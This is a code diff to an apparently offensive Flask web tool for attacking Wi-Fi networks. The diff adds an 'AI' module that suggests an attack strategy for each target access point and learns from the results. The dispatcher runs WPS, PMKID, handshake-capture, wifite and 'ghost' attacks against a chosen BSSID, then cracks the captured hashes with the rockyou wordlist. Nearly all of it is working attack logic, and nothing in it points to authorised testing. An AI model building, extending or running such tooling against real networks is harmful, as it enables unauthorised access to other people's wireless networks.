@@ -13,9 +13,13 @@ from dsi_sniffer import DSISniffer, spoof, scan_network
 
 from dsi_twin import DSITwin
 
+from dsi_twin import DSITwin
+from dsi_ai import DSIAI
+
 app = Flask(__name__)
 
 # Variáveis globais
+BRAIN = DSIAI()
 CURRENT_MONITOR_IFACE = None
 CURRENT_MANAGED_IFACE = None
 SCAN_PROCESS = None
@@ -112,19 +116,51 @@ def api_scan_network():
 def attack_task(attack_type, bssid, channel, essid, privacy):
     vendor = identify_vendor(bssid)
     _, advice = analyze_vulnerabilities(vendor, essid, privacy)
+    
+    # Integração de Inteligência Artificial
+    ai_advice = BRAIN.get_strategy(bssid)
+    
     add_log(f"COMBATE INICIADO: {essid} ({vendor})", log_type="cmd", is_command=True)
     add_log(f"DSI INTEL: {advice}")
+    add_log(f"DSI NEURAL NET: {ai_advice}", log_type="info")
+    
     prefix = f"web_capture_{essid.replace(' ', '_')}"
     cap_file = None
-    if attack_type == 'wps': capture_wps(CURRENT_MONITOR_IFACE, bssid, channel); return
-    if attack_type == 'ghost': start_ghost_attack(CURRENT_MONITOR_IFACE, essid); return
-    if attack_type == 'wifite': start_wifite_expert(CURRENT_MONITOR_IFACE); return
-    if attack_type == 'autopilot': cap_file = run_autopilot(CURRENT_MONITOR_IFACE, {"essid":essid, "bssid":bssid, "channel":channel})
-    elif attack_type == 'vetorx': cap_file = capture_vetor_x(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
+    success = False
+    
+    if attack_type == 'wps':
+        success = capture_wps(CURRENT_MONITOR_IFACE, bssid, channel)
+        BRAIN.learn(bssid, essid, 'wps', success)
+        return
+    if attack_type == 'ghost': 
+        start_ghost_attack(CURRENT_MONITOR_IFACE, essid)
+        BRAIN.learn(bssid, essid, 'ghost', True)
+        return
+    if attack_type == 'wifite': 
+        start_wifite_expert(CURRENT_MONITOR_IFACE)
+        return
+    if attack_type == 'autopilot': 
+        cap_file = run_autopilot(CURRENT_MONITOR_IFACE, {"essid":essid, "bssid":bssid, "channel":channel})
+        if cap_file == "WPS_SUCCESS":
+            BRAIN.learn(bssid, essid, 'autopilot-wps', True)
+            return
+        elif cap_file:
+            BRAIN.learn(bssid, essid, 'autopilot-capture', True)
+        else:
+            BRAIN.learn(bssid, essid, 'autopilot-failed', False)
+    elif attack_type == 'vetorx': 
+        cap_file = capture_vetor_x(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
+        BRAIN.learn(bssid, essid, 'vetorx', cap_file is not None)
     elif attack_type == 'pmkid':
         cap_file = capture_pmkid(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
-        if not cap_file: cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
-    else: cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
+        BRAIN.learn(bssid, essid, 'pmkid', cap_file is not None)
+        if not cap_file: 
+            cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
+            BRAIN.learn(bssid, essid, 'handshake', cap_file is not None)
+    else: 
+        cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
+        BRAIN.learn(bssid, essid, 'handshake', cap_file is not None)
+        
     if cap_file:
         wordlist = "/usr/share/wordlists/rockyou.txt"
         if os.path.exists(wordlist): crack_hash(cap_file, wordlist, bssid)
